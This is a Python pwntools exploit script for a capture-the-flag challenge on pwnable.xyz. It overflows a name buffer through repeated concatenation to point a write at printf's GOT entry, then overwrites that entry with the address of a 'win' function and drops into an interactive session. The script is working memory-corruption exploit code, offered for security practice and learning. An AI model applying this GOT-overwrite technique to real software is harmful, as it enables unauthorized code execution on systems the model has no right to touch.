from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30013

gdbscript = """
set follow-fork-mode child
# b *0x400b6b
"""

# args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def init(r):
    r.sendafter(b"Name: ", b"a")
    r.sendafter(b"Desc: ", b"a")
    
def concat_to_name(r, name):
    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Name: ", name)

def edit_description(r, description):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Desc: ", description)

def print_all(r):
    r.sendlineafter(b"> ", b"3")
    
def main():
    r  = conn()
    init(r)
    
    for i in range(3):
        concat_to_name(r, b"\x00")

    concat_to_name(r, b"a" * 0x80 + pack(exe.got.printf)[:3])    
    edit_description(r, pack(exe.symbols.win))

    r.interactive()

if __name__ == "__main__":
    main()
